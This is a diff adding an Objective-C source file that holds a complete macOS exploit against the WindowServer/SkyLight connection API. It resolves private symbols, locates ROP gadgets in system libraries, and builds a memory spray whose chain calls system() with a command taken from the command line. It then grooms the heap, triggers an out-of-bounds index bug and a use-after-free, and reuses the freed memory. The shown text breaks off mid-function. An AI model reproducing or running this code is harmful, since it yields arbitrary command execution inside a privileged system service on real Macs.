@@ -1,0 +1,932 @@
+#import <Cocoa/Cocoa.h>
+#import <dlfcn.h>
+#import <mach-o/dyld.h>
+#import <mach-o/getsect.h>
+#import <mach/mach_vm.h>
+#import <pthread.h>
+
+#import "offsets.h"
+
+//utils
+#define ENFORCE(a, label) \
+    do { \
+        if (__builtin_expect(!(a), 0)) \
+        { \
+            timed_log("[!] %s is false (l.%d)\n", #a, __LINE__); \
+            goto label; \
+        } \
+    } while (0)
+
+// from https://stackoverflow.com/questions/4415524/common-array-length-macro-for-c
+#define COUNT_OF(x) ((sizeof(x)/sizeof(0[x])) / ((size_t)(!(sizeof(x) % sizeof(0[x])))))
+
+#define BYTE(buff, offset) (*(uint8_t *)&((uint8_t *)buff)[offset])
+#define DWORD(buff, offset) (*(uint32_t *)&((uint8_t *)buff)[offset])
+#define QWORD(buff, offset) (*(uint64_t *)&((uint8_t *)buff)[offset])
+
+// constants used by the exploit
+#define CFSTRING_SPRAY_SIZE (400*1000*1000)
+#define CFSTRING_SPRAY_COUNT ((CFSTRING_SPRAY_SIZE)/(3*0x8+sizeof(str_array)))
+#define CFSET_SPRAY_SIZE (300*1000*1000)
+// pointers (80*8) + internal size (0x40)
+#define CFSET_SPRAY_COUNT ((CFSET_SPRAY_SIZE)/(80*8+0x40))
+#define VULN_IDX (-0xaaaaab)
+// 4GB should be enough and it's the maximum we can spray in one OOL
+#define ROP_SPRAY_SIZE (4*0x400ul*0x400ul*0x400ul - 0x1000)
+#define SPRAYED_BUFFER_ADDRESS 0x200006000
+
+#define NB_CORE_SWITCH 50
+#define NB_HOLES_PER_SWITCH 1000
+#define NB_REUSE 200
+
+// private functions (both private and public symbols)
+static int (* SLSNewConnection)(int, int *);
+static int (* SLPSRegisterForKeyOnConnection)(int, void *, unsigned int, bool);
+static mach_port_t (* CGSGetConnectionPortById)(uint32_t);
+static int (* SLSReleaseConnection)(int);
+static mach_port_t (* SLSServerPort)(void);
+
+
+// push rbp ; mov rbp, rsp ; mov rax, qword ptr [rdi + 8] ; xor esi, esi ; mov edx, 0x118 ; call qword ptr [rax]
+#define SAVE_RBP_SET_RAX_GADGET ((uint8_t[]){0x55, 0x48, 0x89, 0xe5, 0x48, 0x8b, 0x47, 0x08, 0x31, 0xf6, 0xba, 0x18, 0x01, 0x00, 0x00, 0xff, 0x10})
+
+// mov rax, qword ptr [rax + 8] ; mov rsi, qword ptr [rax] ; call qword ptr [rsi]
+#define SET_RSI_GADGET ((uint8_t[]){0x48, 0x8b, 0x40, 0x08, 0x48, 0x8b, 0x30, 0xff, 0x16})
+
+// mov rdi, qword ptr [rsi + 0x30] ; mov rax, qword ptr [rsi + 0x38] ; mov rsi, qword ptr [rax] ; call qword ptr [rsi]
+#define SET_RDI_GADGET ((uint8_t[]){0x48, 0x8b, 0x7e, 0x30, 0x48, 0x8b, 0x46, 0x38, 0x48, 0x8b, 0x30, 0xff, 0x16})
+
+// mov rax, qword ptr [rsi + 0x10] ; mov rsi, qword ptr [rax + 0x20] ; mov rax, qword ptr [rsi - 8] ; mov rax, qword ptr [rax] ; pop rbp ; jmp rax
+#define POP_RBP_JMP_GADGET ((uint8_t[]){0x48, 0x8b, 0x46, 0x10, 0x48, 0x8b, 0x70, 0x20, 0x48, 0x8b, 0x46, 0xf8, 0x48, 0x8b, 0x00, 0x5d, 0xff, 0xe0})
+
+static int resolve_symbols();
+static int build_rop_spray(void **rop_spray, char *command_line);
+static int massage_heap(int connection_id);
+static int register_application(int connection_id);
+static int setup_hooks(int connection_id);
+static int trigger_the_bug(int connection_id);
+static int reuse_allocation(int connection_id);
+static int find_dylib_text_section(const char *dylib_name, void **text_address, size_t *text_size);
+static void timed_log(char* format, ...);
+
+static mach_msg_return_t _CGSSetConnectionProperty(mach_port_t connection_port, int connection_id, const char *key_value, const void *serialized_value, uint32_t serialized_value_length, bool deallocate);
+static mach_msg_return_t _CGSSetAuxConn(uint32_t connection_id, ProcessSerialNumber *process_serial_number);
+static mach_msg_return_t _CGSCreateApplication(uint32_t connection_id, ProcessSerialNumber sn, uint32_t session_id, uint32_t session_attributes, uint32_t unknown_2, pid_t pid, char *app_name, char multi_process, uint32_t sent_connection_id);
+
+int main(int argc, char **argv)
+{
+    int connection_id = -1;
+    void *rop_spray = NULL;
+    bool free_application = false;
+
+    ENFORCE(argc == 2, fail);
+    ENFORCE(strlen(argv[1]) < 0x1000 - 0x600, fail);
+    
+    timed_log("[+] Resolving symbols...\n");
+    ENFORCE(resolve_symbols() == 0, fail);
+
+    timed_log("[+] Building our ROP chain...\n");
+    ENFORCE(build_rop_spray(&rop_spray, argv[1]) == 0, fail);
+
+    timed_log("[+] Creating a fresh connection...\n");
+    ENFORCE(SLSNewConnection(0, &connection_id) == 0, fail);
+
+    timed_log("[+] Setup 'hooks'...\n");
+    ENFORCE(setup_hooks(connection_id) == 0, fail);
+
+    timed_log("[+] Making holes (des p'tits trous, des p'tits trous, toujours des p'tit trous : https://www.youtube.com/watch?v=HsX4M-by5OY)...\n");
+    ENFORCE(massage_heap(connection_id) == 0, fail);
+
+    // no timed_log, we want to be fast :)
+    ENFORCE(register_application(connection_id) == 0, fail);
+    free_application = true;
+    timed_log("[+] Application registered...\n");
+
+    timed_log("[+] Triggering the bug\n");
+    ENFORCE(trigger_the_bug(connection_id) == 0, fail);
+
+    timed_log("[+] Let's free and reuse the application...\n");
+    // this will whack the application
+    free_application = false;
+    ENFORCE(reuse_allocation(connection_id) == 0, fail);
+
+    timed_log("[+] Trigger the UAF...\n");
+    ENFORCE(_CGSSetConnectionProperty(CGSGetConnectionPortById(connection_id), connection_id, "SPRAY", rop_spray, ROP_SPRAY_SIZE, true) == KERN_SUCCESS, fail);
+    // the kernel freed the pages for us :)
+    rop_spray = NULL;
+
+    // a last synchronised request to make sure our command has been executed...
+    ENFORCE(SLPSRegisterForKeyOnConnection(connection_id, &(ProcessSerialNumber){0, 0}, 8, 1) == -50, fail);
+
+    // don't leave any connections behind us...
+    ENFORCE(SLSReleaseConnection(connection_id) == 0, fail);
+    connection_id = -1;
+    timed_log("[+] OK\n");
+    return 0;
+
+// fail is the label of choice when coding Apple exploit :) (cf. CVE-2014-1266)
+fail:
+    if (free_application)
+    {
+        ProcessSerialNumber psn;
+        psn.highLongOfPSN = 0;
+        psn.lowLongOfPSN = 0x12340000;
+        _CGSCreateApplication(connection_id, psn, 2, 0, 2, getpid(), "a", false, connection_id);
+    }
+    if (connection_id != -1)
+        SLSReleaseConnection(connection_id);
+    if (rop_spray != NULL)
+        mach_vm_deallocate(mach_task_self(), (mach_vm_address_t)rop_spray, ROP_SPRAY_SIZE);
+    return 1;
+}
+
+
+static int resolve_symbols()
+{
+    SLSNewConnection = dlsym(RTLD_DEFAULT, "SLSNewConnection");
+    ENFORCE(SLSNewConnection != NULL, fail);
+    SLPSRegisterForKeyOnConnection = dlsym(RTLD_DEFAULT, "SLPSRegisterForKeyOnConnection");
+    ENFORCE(SLPSRegisterForKeyOnConnection != NULL, fail);
+    SLSReleaseConnection = dlsym(RTLD_DEFAULT, "SLSReleaseConnection");
+    ENFORCE(SLSReleaseConnection != NULL, fail);
+    SLSServerPort = dlsym(RTLD_DEFAULT, "SLSServerPort");
+    ENFORCE(SLSServerPort != NULL, fail);
+
+    // ugly but we could find its address by parsing private symbols, we just don't want to waste our time coding it...
+    ENFORCE(((uintptr_t)SLPSRegisterForKeyOnConnection & 0xFFF) == (SLPSRegisterForKeyOnConnection_OFFSET & 0xFFF), fail);
+    CGSGetConnectionPortById = (void *)((uint8_t*)SLPSRegisterForKeyOnConnection - SLPSRegisterForKeyOnConnection_OFFSET + CGSGetConnectionPortById_OFFSET);
+
+    // paranoid checks, check if function starts with push rbp / mov rbp, rsp
+    ENFORCE(memcmp(CGSGetConnectionPortById, "\x55\x48\x89\xe5", 4) == 0, fail);
+    return 0;
+fail:
+    return -1;
+}
+
+// the trick is here to map multiple times the same page to make a HUGE alloc that doesn't use a lot of physical memory
+static int build_rop_spray(void **rop_spray, char *command_line)
+{
+    void *handle_libswiftCore = NULL;
+    void* large_region = NULL;
+
+    *rop_spray = NULL;
+
+    // first we reserve a large region
+    ENFORCE(mach_vm_allocate(mach_task_self(), (mach_vm_address_t *)&large_region, ROP_SPRAY_SIZE, VM_FLAGS_ANYWHERE) == KERN_SUCCESS, fail);
+
+    // then we allocate the first page
+    void *rop_chain = large_region;
+    ENFORCE(mach_vm_allocate(mach_task_self(), (mach_vm_address_t *)&rop_chain, 0x1000, VM_FLAGS_FIXED | VM_FLAGS_OVERWRITE) == KERN_SUCCESS, fail);
+
+    // now we can construct our rop chain
+    void *release_selector = NSSelectorFromString(@"release");
+    ENFORCE(release_selector != NULL, fail);
+
+
+
+    // + 0x530 because of our forged CFSet and its 1st hash table entry  (=0x200002537)
+    BYTE(rop_chain, 0x530 + 0x20) = 0;  // flags
+    DWORD(rop_chain, 0x530 + 0x18) = 0; // mask
+    QWORD(rop_chain, 0x530 + 0x10) = SPRAYED_BUFFER_ADDRESS; // cache address
+    QWORD(rop_chain, 0) = (uint64_t)release_selector; // selector
+
+
+    // and now the """fun""" part...
+    handle_libswiftCore = dlopen("/System/Library/PrivateFrameworks/Swift/libswiftCore.dylib", RTLD_GLOBAL | RTLD_NOW);
+    ENFORCE(handle_libswiftCore != NULL, fail);
+
+    void *libJPEG_text_addr;
+    size_t libJPEG_text_size;
+    ENFORCE(find_dylib_text_section("/System/Library/Frameworks/ImageIO.framework/Versions/A/Resources/libJPEG.dylib", &libJPEG_text_addr, &libJPEG_text_size) == 0, fail);
+
+    void *libswiftCore_text_addr;
+    size_t libswiftCore_text_size;
+    ENFORCE(find_dylib_text_section("/System/Library/PrivateFrameworks/Swift/libswiftCore.dylib", &libswiftCore_text_addr, &libswiftCore_text_size) == 0, fail);
+    uintptr_t system_address = (uintptr_t)dlsym(RTLD_DEFAULT, "system");
+    ENFORCE(system_address != 0, fail);
+
+    // check our gadgets
+    uintptr_t save_rbp_set_rax = (uintptr_t)memmem(libJPEG_text_addr, libJPEG_text_size, SAVE_RBP_SET_RAX_GADGET, sizeof(SAVE_RBP_SET_RAX_GADGET));
+    ENFORCE(save_rbp_set_rax != 0, fail);
+    uintptr_t set_rsi = (uintptr_t)memmem(libswiftCore_text_addr, libswiftCore_text_size, SET_RSI_GADGET, sizeof(SET_RSI_GADGET));
+    ENFORCE(set_rsi != 0, fail);
+    uintptr_t set_rdi = (uintptr_t)memmem(libswiftCore_text_addr, libswiftCore_text_size, SET_RDI_GADGET, sizeof(SET_RDI_GADGET));
+    ENFORCE(set_rdi != 0, fail);
+    uintptr_t pop_rbp_jmp = (uintptr_t)memmem(libswiftCore_text_addr, libswiftCore_text_size, POP_RBP_JMP_GADGET, sizeof(POP_RBP_JMP_GADGET));
+    ENFORCE(pop_rbp_jmp != 0, fail);
+
+    ENFORCE(dlclose(handle_libswiftCore) == 0, fail);
+    handle_libswiftCore = NULL;
+    
+    timed_log("[i] Pivot address: 0x%lX\n", save_rbp_set_rax);
+
+    QWORD(rop_chain, 8) = save_rbp_set_rax; // pivot
+
+
+    // SAVE_RBP_SET_RAX: push rbp ; mov rbp, rsp ; mov rax, qword ptr [rdi + 8] ; xor esi, esi ; mov edx, 0x118 ; call qword ptr [rax]
+    // + 0x137 because of our forged CFSet and its 2nd hash table entry 
+    QWORD(rop_chain, 0x137) = set_rsi;
+    // rax=0x200002137
+
+    // SET_RSI: mov rax, qword ptr [rax + 8] ; mov rsi, qword ptr [rax] ; call qword ptr [rsi]
+    QWORD(rop_chain, 0x137+8) = SPRAYED_BUFFER_ADDRESS+0x240;
+    // rax=SPRAYED_BUFFER_ADDRESS+0x240
+    QWORD(rop_chain, 0x240) = SPRAYED_BUFFER_ADDRESS+0x248;
+    // rsi=SPRAYED_BUFFER_ADDRESS+0x248
+    QWORD(rop_chain, 0x248) = set_rdi;
+
+    // SET_RDI: mov rdi, qword ptr [rsi + 0x30] ; mov rax, qword ptr [rsi + 0x38] ; mov rsi, qword ptr [rax] ; call qword ptr [rsi]
+    QWORD(rop_chain, 0x248+0x30) = SPRAYED_BUFFER_ADDRESS+0x600;
+    // rdi=SPRAYED_BUFFER_ADDRESS+0x500
+    QWORD(rop_chain, 0x248+0x38) = SPRAYED_BUFFER_ADDRESS+0x248+0x38+8;
+    // rax=SPRAYED_BUFFER_ADDRESS+0x288
+    QWORD(rop_chain, 0x288) = SPRAYED_BUFFER_ADDRESS+0x288+8;
+    // rsi=SPRAYED_BUFFER_ADDRESS+0x290
+    QWORD(rop_chain, 0x290) = pop_rbp_jmp;
+
+    for (uint32_t i = 0; i < 4; i++)
+    {
+        // POP_RBP_JMP: mov rax, qword ptr [rsi + 0x10] ; mov rsi, qword ptr [rax + 0x20] ; mov rax, qword ptr [rsi - 8] ; mov rax, qword ptr [rax] ; pop rbp ; jmp rax
+        QWORD(rop_chain, i*0x48+0x290+0x10) = SPRAYED_BUFFER_ADDRESS+i*0x48+0x290+0x10+8;
+        // rax=SPRAYED_BUFFER_ADDRESS+0x2A8
+        QWORD(rop_chain, i*0x48+0x2A8+0x20) = SPRAYED_BUFFER_ADDRESS+i*0x48+0x2A8+0x20+8+8;
+        // rsi=SPRAYED_BUFFER_ADDRESS+0x2D8
+        QWORD(rop_chain, i*0x48+0x2D8-8) = SPRAYED_BUFFER_ADDRESS+i*0x48+0x2A8+0x20+8+8;
+        // rax=SPRAYED_BUFFER_ADDRESS+0x2D8
+        QWORD(rop_chain, i*0x48+0x2D8) = i == 3 ? system_address : pop_rbp_jmp;
+        // rax=SPRAYED_BUFFER_ADDRESS+0x2D80x600
+    }
+    strcpy((char *)&BYTE(rop_chain, 0x600), command_line);
+
+    QWORD(rop_chain, 0x1000-8) = 0xFFFFFFFF; // make sure that the server won't try to parse this...
+
+    // and duplicate it, we use two for loops to gain some time
+    for (uintptr_t i = 0x1000ul; i < 4*0x400*0x400; i += 0x1000ul)
+    {
+        mach_vm_address_t remapped_page_address = (mach_vm_address_t)large_region+i;
+        vm_prot_t protection = VM_PROT_READ;
+        kern_return_t kr;
+        kr = mach_vm_remap(
+            mach_task_self(), 
+            &remapped_page_address, 
+            0x1000, 
+            0, 
+            VM_FLAGS_FIXED | VM_FLAGS_OVERWRITE, 
+            mach_task_self(), 
+            (mach_vm_address_t)rop_chain,
+            0,
+            &protection, 
+            &protection, 
+            VM_INHERIT_NONE
+        );
+        ENFORCE(kr == KERN_SUCCESS, fail);
+        ENFORCE(remapped_page_address == (mach_vm_address_t)large_region+i, fail);
+    }
+    for (uintptr_t i = 4*0x400*0x400; i < ROP_SPRAY_SIZE; i += 4*0x400*0x400)
+    {
+        mach_vm_address_t remapped_page_address = (mach_vm_address_t)large_region+i;
+        vm_prot_t protection = VM_PROT_READ;
+        kern_return_t kr;
+        kr = mach_vm_remap(
+            mach_task_self(), 
+            &remapped_page_address, 
+            4*0x400*0x400, 
+            0, 
+            VM_FLAGS_FIXED | VM_FLAGS_OVERWRITE, 
+            mach_task_self(), 
+            (mach_vm_address_t)rop_chain,
+            0,
+            &protection, 
+            &protection, 
+            VM_INHERIT_NONE
+        );
+        ENFORCE(kr == KERN_SUCCESS, fail);
+        ENFORCE(remapped_page_address == (mach_vm_address_t)large_region+i, fail);
+    }
+    *rop_spray = large_region;
+    return 0;
+fail:
+    if (handle_libswiftCore != NULL)
+        dlclose(handle_libswiftCore);
+    if (large_region != NULL)
+        mach_vm_deallocate(mach_task_self(), (mach_vm_address_t)large_region, ROP_SPRAY_SIZE);
+    return -1;
+}
+
+size_t malloc_size(void *);
+static int massage_heap(int connection_id)
+{
+    static UInt8 data_buffer[0x70];
+
+    memset(data_buffer, 'A', 0x70);
+
+    CFDataRef hole_data = NULL;
+    CFNumberRef place_holder_number = NULL;
+    CFDataRef serialized_hole_0x60_data = NULL;
+    CFDataRef serialized_hole_0x70_data = NULL;
+    CFDataRef serialized_number_place_holder = NULL;
+    bool free_tmp_application = false;
+
+    hole_data = CFDataCreate(NULL, data_buffer, 0x60 - 0x40 - 0x20);
+    ENFORCE(hole_data != NULL, fail);
+    serialized_hole_0x60_data = CFPropertyListCreateData(NULL, hole_data, kCFPropertyListBinaryFormat_v1_0, 0, NULL);
+    ENFORCE(serialized_hole_0x60_data != NULL, fail);
+    CFRelease(hole_data);
+    hole_data = NULL;
+
+    hole_data = CFDataCreate(NULL, data_buffer, 0x70 - 0x40 - 0x20);
+    ENFORCE(hole_data != NULL, fail);
+    serialized_hole_0x70_data = CFPropertyListCreateData(NULL, hole_data, kCFPropertyListBinaryFormat_v1_0, 0, NULL);
+    ENFORCE(serialized_hole_0x70_data != NULL, fail);
+    CFRelease(hole_data);
+    hole_data = NULL;
+
+    uint64_t v = 0x1337BAB;
+    place_holder_number = CFNumberCreate(NULL, kCFNumberSInt64Type, &v);
+    ENFORCE(place_holder_number != NULL, fail);
+    serialized_number_place_holder = CFPropertyListCreateData(NULL, place_holder_number, kCFPropertyListBinaryFormat_v1_0, 0, NULL);
+    ENFORCE(serialized_number_place_holder != NULL, fail);
+    CFRelease(place_holder_number);
+    place_holder_number = NULL;
+    // now free the data to make holes :)
+
+    uint8_t *placeholder_data_bytes = (uint8_t *)CFDataGetBytePtr(serialized_number_place_holder);
+    size_t placeholder_data_size = CFDataGetLength(serialized_number_place_holder);
+
+    for (uint32_t i = 0; i < NB_CORE_SWITCH; i++)
+    {
+        ProcessSerialNumber psn;
+        psn.highLongOfPSN = 0;
+        psn.lowLongOfPSN = 0x6660000;
+
+        // help changing core...
+        ENFORCE(_CGSCreateApplication(connection_id, psn, 0, 0, 2, getpid(), "a", true, connection_id) == KERN_SUCCESS, fail);
+        free_tmp_application = true;
+
+        for (uint32_t j = 0; j < NB_HOLES_PER_SWITCH; j++)
+        {
+            char key[20];
+            snprintf(key, sizeof(key), "MSSG_%4d_%4d", i, j);
+
+            CFDataRef data = j%2 == 0 ? serialized_hole_0x70_data : serialized_hole_0x60_data;
+            uint8_t *data_bytes = (uint8_t *)CFDataGetBytePtr(data);
+            size_t data_size = CFDataGetLength(data);
+
+            ENFORCE(_CGSSetConnectionProperty(CGSGetConnectionPortById(connection_id), connection_id, key, data_bytes, data_size, false) == KERN_SUCCESS, fail);
+
+            snprintf(key, sizeof(key), "MSSH_%4d_%4d", i, j);
+            ENFORCE(_CGSSetConnectionProperty(CGSGetConnectionPortById(connection_id), connection_id, key, placeholder_data_bytes, placeholder_data_size, false) == KERN_SUCCESS, fail);
+        }
+        ENFORCE(_CGSCreateApplication(connection_id, psn, 1, 0, 2, getpid(), "a", false, connection_id) == -50, fail);
+        free_tmp_application = false;
+    }
+    CFRelease(serialized_number_place_holder);
+    serialized_number_place_holder = NULL;
+    CFRelease(serialized_hole_0x60_data);
+    serialized_hole_0x60_data = NULL;
+    CFRelease(serialized_hole_0x70_data);
+    serialized_hole_0x70_data = NULL;
+
+    for (uint32_t i = 0; i < NB_CORE_SWITCH; i++)
+    {
+        for (uint32_t j = 0; j < NB_HOLES_PER_SWITCH; j++)
+        {
+            char key[20];
+            snprintf(key, sizeof(key), "MSSG_%4d_%4d", i, j);
+
+            ENFORCE(_CGSSetConnectionProperty(CGSGetConnectionPortById(connection_id), connection_id, key, NULL, 0, false) == KERN_SUCCESS, fail);
+        }
+    }
+    return 0;
+
+fail:
+    if (hole_data != NULL)
+        CFRelease(hole_data);
+    if (serialized_hole_0x60_data != NULL)
+        CFRelease(serialized_hole_0x60_data);
+    if (serialized_hole_0x70_data != NULL)
+        CFRelease(serialized_hole_0x70_data);
+    if (place_holder_number != NULL)
+        CFRelease(place_holder_number);
+    if (serialized_number_place_holder != NULL)
+        CFRelease(serialized_number_place_holder);
+    if (free_tmp_application)
+    {
+        ProcessSerialNumber psn;
+        psn.highLongOfPSN = 0;
+        psn.lowLongOfPSN = 0x6660000;
+        _CGSCreateApplication(connection_id, psn, 2, 0, 2, getpid(), "a", false, connection_id);
+    }
+    return -1;
+}
+
+static int register_application(int connection_id)
+{
+    ProcessSerialNumber psn;
+    bool free_application = false;
+    char app_name[0x40];
+
+    // app_name must be > 0x20 to not use the tiny holes reserved for CFSet and it must be big enough to fill the rest of the space left by the application
+    memset(app_name, 'B', sizeof(app_name)-1);
+    app_name[COUNT_OF(app_name)-1] = 0;
+
+    psn.highLongOfPSN = 0;
+    psn.lowLongOfPSN = 0x12340000;
+    ENFORCE(_CGSCreateApplication(connection_id, psn, 0, 0, 2, getpid(), app_name, true, connection_id) == KERN_SUCCESS, fail);
+    free_application = true;
+
+    // use a psn in the middle-end of our spray
+    psn.lowLongOfPSN = 0x12340000;
+    ENFORCE(_CGSSetAuxConn(connection_id, &psn) == 0, fail);
+    return 0;
+
+fail:
+    if (free_application)
+    {
+        psn.highLongOfPSN = 0;
+        psn.lowLongOfPSN = 0x12340000;
+        _CGSCreateApplication(connection_id, psn, 2, 0, 2, getpid(), "a", false, connection_id);
+    }
+    return -1;
+}
+
+static int setup_hooks(int connection_id)
+{
+    CFNumberRef set_array_values[35] = {NULL};
+    CFMutableArrayRef big_array = NULL;
+    CFDataRef data = NULL;
+
+    timed_log("[+] Forging our set...\n");
+
+    uint8_t set_hash_table[71] = {
+        0, 1, 0, 1, 0, 1, 0, 1, 0, 1,
+        0, 1, 0, 1, 0, 1, 0, 1, 0, 1,
+        0, 1, 0, 1, 0, 1, 0, 1, 0, 1,
+        0, 1, 0, 1, 0, 1, 0, 1, 0, 1,
+        0, 1, 0, 1, 0, 1, 0, 1, 0, 1,
+        0, 1, 0, 1, 0, 1, 0, 1, 0, 1,
+        0, 1, 0, 1, 0, 1, 0, 1, 0, 1,
+        0
+    };
+    uint32_t set_size = 0;
+    uint64_t v = 0x400000001;
+    while (set_size < COUNT_OF(set_array_values))
+    {
+        CFNumberRef n;
+        n = CFNumberCreate(NULL, kCFNumberSInt64Type, &v);
+        ENFORCE(n != NULL, fail);
+        uint32_t h = CFHash(n)%71;
+        if (set_hash_table[h] == 1)
+        {
+            set_array_values[set_size] = n;
+            set_hash_table[h] = 0;
+            set_size ++;
+        }
+        else
+        {
+            CFRelease(n);
+        }
+        v++;
+        ENFORCE(v < 0x400000001 + 0xFFFFF, fail);
+    }
+
+    big_array = CFArrayCreateMutable(NULL, 0, &kCFTypeArrayCallBacks);
+    ENFORCE(big_array != NULL, fail);
+
+    timed_log("[+] Creating our big set array...\n");
+
+    for (uint32_t i = 0; i < CFSET_SPRAY_COUNT; i++)
+    {
+        CFArrayRef tmp_array = CFArrayCreate(NULL, (const void **)set_array_values, COUNT_OF(set_array_values), &kCFTypeArrayCallBacks);
+        ENFORCE(tmp_array != NULL, fail);
+        CFArrayAppendValue(big_array, tmp_array);
+        CFRelease(tmp_array);
+    }
+
+    for (uint32_t i = 0; i < COUNT_OF(set_array_values); i++)
+    {
+        CFRelease(set_array_values[i]);
+        set_array_values[i] = NULL;
+    }
+
+    timed_log("[+] Serializing it...\n");
+
+    data = CFPropertyListCreateData(NULL, big_array, kCFPropertyListBinaryFormat_v1_0, 0, NULL);
+    ENFORCE(data != NULL, fail);
+    CFRelease(big_array);
+    big_array = NULL;
+
+    uint8_t *data_bytes = (uint8_t *)CFDataGetBytePtr(data);
+    size_t data_size = CFDataGetLength(data);
+
+    timed_log("[i] Serialized size: %ldMB\n", data_size / (1000*1000));
+
+    timed_log("[+] Patching it...\n");
+    uint32_t nb_arrays = 0;
+    uint32_t cursor = 0;
+    while (1)
+    {
+        uint8_t *position = memmem(&data_bytes[cursor], data_size-cursor, "\xAF\x10\x23", 3);
+        if (position == NULL)
+            break;
+        position[0] = 0xCF; // Array to Set
+        nb_arrays ++;
+        ENFORCE(nb_arrays <= CFSET_SPRAY_COUNT, fail);
+        cursor = (uint32_t)(position-data_bytes) + 3;
+    }
+    ENFORCE(nb_arrays == CFSET_SPRAY_COUNT, fail);
+
+    ENFORCE(_CGSSetConnectionProperty(CGSGetConnectionPortById(connection_id), connection_id, "SPRAY", data_bytes, data_size, false) == KERN_SUCCESS, fail);
+    CFRelease(data);
+    data = NULL;
+    return 0;
+    
+fail:
+    for (uint32_t i = 0; i < COUNT_OF(set_array_values); i++)
+        if (set_array_values[i] != NULL)
+            CFRelease(set_array_values[i]); 
+    if (data != NULL)
+        CFRelease(data);
+    if (big_array != NULL)
+        CFRelease(big_array);
+    return -1;
+}
+
+static int trigger_the_bug(int connection_id)
+{
+    ProcessSerialNumber psn;
+
+    psn.highLongOfPSN = 0;
+    psn.lowLongOfPSN = 0x12340000;
+    int32_t index = VULN_IDX;
+    int err;
+    while ((err = SLPSRegisterForKeyOnConnection(connection_id, &psn, index, 1)) != 0)
+    {
+        // ENFORCE((err == 1011) || (err == -600), fail);
+        ENFORCE(++index < VULN_IDX+((2*8*1024*1024)/0x18), fail); // = 2 small regions = 16 MiB
+    }
+    return 0;
+fail:
+    return -1;
+}
+
+
+static int reuse_allocation(int connection_id)
+{
+    CFNumberRef set_array_values[8] = {NULL};
+    CFMutableArrayRef big_array = NULL;
+    CFDataRef data = NULL;
+    bool free_tmp_application = false;
+    bool free_application = true;
+
+    timed_log("[+] Forging our set...\n");
+
+    uint8_t set_hash_table[13];
+    memset(set_hash_table, 1, sizeof(set_hash_table));
+
+    uint64_t v;
+    v = 0x2000025;
+    set_array_values[0] = CFNumberCreate(NULL, kCFNumberSInt64Type, &v); // == 0x200002537 -> hash = 0
+    ENFORCE(CFHash(set_array_values[0])%COUNT_OF(set_hash_table) == 0, fail);
+    set_hash_table[0] = 0;
+
+    v = 0x2000021;
+    set_array_values[1] = CFNumberCreate(NULL, kCFNumberSInt64Type, &v); // == 0x200002137; -> hash = 1
+    ENFORCE(CFHash(set_array_values[1])%COUNT_OF(set_hash_table) == 1, fail);
+    set_hash_table[1] = 0;
+
+    v = 0;
+    uint32_t set_size = 2;
+    while (set_size < COUNT_OF(set_array_values))
+    {
+        CFNumberRef n;
+        n = CFNumberCreate(NULL, kCFNumberSInt64Type, &v);
+        ENFORCE(n != NULL, fail);
+        uint32_t h = CFHash(n)%COUNT_OF(set_hash_table);
+        if (set_hash_table[h] == 1)
+        {
+            set_array_values[set_size] = n;
+            set_hash_table[h] = 0;
+            set_size ++;
+        }
+        else
+        {
+            CFRelease(n);
+        }
+        v++;
+        ENFORCE(v < 0xFFFFF, fail);
+    }
+
+    big_array = CFArrayCreateMutable(NULL, 0, &kCFTypeArrayCallBacks);
+    ENFORCE(big_array != NULL, fail);
+
+    timed_log("[+] Creating our big set array...\n");
+
+    for (uint32_t i = 0; i < NB_REUSE; i++)
+    {
+        CFArrayRef tmp_array = CFArrayCreate(NULL, (const void **)set_array_values, COUNT_OF(set_array_values), &kCFTypeArrayCallBacks);
+        ENFORCE(tmp_array != NULL, fail);
+        CFArrayAppendValue(big_array, tmp_array);
+        CFRelease(tmp_array);
+    }
+
+    for (uint32_t i = 0; i < COUNT_OF(set_array_values); i++)
+    {
+        CFRelease(set_array_values[i]);
+        set_array_values[i] = NULL;
+    }
+
+    timed_log("[+] Serializing it...\n");
+
+    data = CFPropertyListCreateData(NULL, big_array, kCFPropertyListBinaryFormat_v1_0, 0, NULL);
+    ENFORCE(data != NULL, fail);
+    CFRelease(big_array);
+    big_array = NULL;
+
+    uint8_t *data_bytes = (uint8_t *)CFDataGetBytePtr(data);
+    size_t data_size = CFDataGetLength(data);
+
+    timed_log("[i] Serialized size: %ldMB\n", data_size / (1000*1000));
+
+    timed_log("[+] Patching it...\n");
+
+    uint32_t nb_arrays = 0;
+    uint32_t cursor = 0;
+    while (1)
+    {
+        uint8_t *position = memmem(&data_bytes[cursor], data_size-cursor, "\xA8\x02\x03", 3);
+        if (position == NULL)
+            break;
+        position[0] = 0xC8; // Array to Set
+        nb_arrays ++;
+        ENFORCE(nb_arrays <= NB_REUSE, fail);
+        cursor = (uint32_t)(position-data_bytes) + 3;
+    }
+    ENFORCE(nb_arrays == NB_REUSE, fail);
+
+    ProcessSerialNumber psn;
+    psn.highLongOfPSN = 0;
+    psn.lowLongOfPSN = 0x12340000;
+    ENFORCE(_CGSCreateApplication(connection_id, psn, 1, 0, 2, getpid(), "a", false, connection_id) == -50, fail);
+    free_application = false;
+
+    for (uint32_t i = 0; i < 1000; i++)
+    {
+        char key[0x80];
+        ProcessSerialNumber psn;
+
+        psn.highLongOfPSN = 0;
+        psn.lowLongOfPSN = 0x56780000;
+
+        // help changing core...
+        ENFORCE(_CGSCreateApplication(connection_id, psn, 0, 0, 2, getpid(), "a", true, connection_id) == KERN_SUCCESS, fail);
+        free_tmp_application = true;
+        // we use a long name to make sure it'll not be placed in our holes :)
+        snprintf(key, sizeof(key), "FAKE_OBJECT_WITH_A_VERY_LOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOONG_NAME_%d", i);
+        ENFORCE(_CGSSetConnectionProperty(CGSGetConnectionPortById(connection_id), connection_id, key, data_bytes, data_size, false) == KERN_SUCCESS, fail);
+        ENFORCE(_CGSCreateApplication(connection_id, psn, 1, 0, 2, getpid(), "a", false, connection_id) == -50, fail);
+        free_tmp_application = false;
+        usleep(10);
+    }
+    CFRelease(data);
+    data = NULL;
+    return 0;
+    
+fail:
+    if (free_application)
+    {
+        ProcessSerialNumber psn;
+        psn.highLongOfPSN = 0;
+        psn.lowLongOfPSN = 0x12340000;
+        _CGSCreateApplication(connection_id, psn, 2, 0, 2, getpid(), "a", false, connection_id);
+    }
+    if (free_tmp_application)
+    {
+        ProcessSerialNumber psn;
+        psn.highLongOfPSN = 0;
+        psn.lowLongOfPSN = 0x56780000;
+        _CGSCreateApplication(connection_id, psn, 2, 0, 2, getpid(), "a", false, connection_id);
+    }
+    for (uint32_t i = 0; i < COUNT_OF(set_array_values); i++)
